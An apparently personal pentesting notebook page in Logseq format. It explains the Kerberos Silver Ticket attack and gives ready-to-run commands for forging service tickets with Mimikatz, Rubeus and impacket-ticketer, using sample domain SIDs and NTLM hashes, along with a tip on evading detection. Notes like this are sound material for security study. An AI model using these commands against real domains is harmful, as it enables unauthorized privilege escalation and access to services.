public:: true

- [As we know](((655b6438-6055-4038-b37b-457c7b623610))), in the Kerberos protocol, user's permissions included in the [TGS](((655b24f3-a272-4dc0-814f-e7b3a4edf632))) (in the [PAC](((6564d528-627a-4b9b-b5b3-e57ff5477619))) block) are checked **by the application server** and not from the domain controller, except if [PAC validation](((655f615a-5051-4943-9791-934b3b6173bb))) is enabled.
- In case we are able to craft TGS tickets by ourselves we could spoof the specified users' permissions, actually grant us any permission we want.
- The TGS is encrypted by the [KDC](((6565b3f7-61b6-4b2a-a59d-01d20e6acd96))) with the password (hash) of the domain account to whom the [SPN](((655e0fad-5b48-42ce-b82a-09cd0e4a9322))) is assigned. Hence, we **need that account password** or at lease its hash to successfully perform a Silver Ticket attack.
- Let's consider we already got that password, for instance we retrieved it via [[Kerberoasting]] or dumped from the LSASS process' memory of a machine we broke into
- We can now forge TGS tickets for that SPN. And by doing that we can specify any permission we want into it.
- #+BEGIN_WARNING
  Permissions are defined in the PAC block of the TGS and this block is always **signed by the *krbtgt* user** *(only known by the KDC)*.
  
  That means we **cannot create a valid signature for the PAC** block.
  #+END_WARNING
- But, as we already saw in the [Kerberos workflow]([[Kerberos]]), PAC validation [is rarely performed](((656894a3-41d7-4b62-b202-c967caa53483))) by application servers. So we could expect that the application server will **blindly trust** the TGS we'll provide, without asking the KDC to validate the PAC signature in it.
  id:: 65689610-32fb-4241-99c9-b06cadf5f80c
- #+BEGIN_NOTE
  Thanks to Silver Tickets we might access resources from the targeted SPN that we shouldn't be able to access otherwise.
  #+END_NOTE
- Forge Silver Tickets
	- Ingredients
		- The SPN password hash
		  logseq.order-list-type:: number
			- Once the account [password is rotated](((6568a1fb-58d3-4402-bbb5-8c3d1bca729e))) or reset, we won't be able to generate TGS tickets anymore.
		- The SPN
		  logseq.order-list-type:: number
		- The [domain SID](((6568a492-a226-4069-a5ef-127a23fb9de5)))
		  logseq.order-list-type:: number
	- From Windows
	  id:: 6568a340-887a-4e0e-9515-0344e4728aaa
		- With [[Mimikatz]]
		  id:: 656a21e7-a8f6-4b59-9b30-521a3268a8f0
		  ```
		  kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
		  ```
			- `/sid` - The domain SID
			- `/domain` - The domain name
			- `/target` - The target where the SPN runs
			- `/service` - The SPN protocol
			- `/rc4` - NTLM hash of the account with the target SPN assigned
				- If available, it's always better use AES keys to minimize the detection risk
			- `/ptt` - To automatically inject the created ticket into the local LSASS process' memory
			- `/user` - The domain user we want to get access from
				- However, we could also use any other domain user since we can set the permissions and groups ourselves.
			- By default Mimikatz automatically set very high permissions, like *local-administrator* (500) and membership of the *Domain Admins* group (512). Plus others.
			- Full documentation [here](https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos#golden)
		- With [[Rubeus]]
		  id:: 6568aad6-ac91-4776-b544-a06110eec895
		  ```powershell
		  Rubeus.exe silver /service:cifs/SQL1.rubeus.ghostpack.local /rc4:f74b07eb77caa52b8d227a113cb649a6 /user:ccob /domain:rubeus.ghostpack.local /ptt
		  ```
			- `/service` - The target SPN
			- `/rc4` - NTLM hash of the account with the target SPN assigned
				- If available, it's always better use AES keys (`/aes256`) to minimize the detection risk
			- `/user` - The domain user we want to get access from
			- `/domain` - The domain name
			- `/ptt` - To automatically inject the created ticket into the local LSASS process' memory
			- Full documentation [here](https://github.com/GhostPack/Rubeus#silver)
	- From Linux
		- With [[impacket-ticketer]]
		  ```bash
		  impacket-ticketer \
		    -nthash b18b4b218eccad1c223306ea1916885f \
		    -domain-sid S-1-5-21-1339291983-1349129144-367733775 \
		    -domain jurassic.park \
		    -spn cifs/labwws02.jurassic.park stegosaurus
		  ```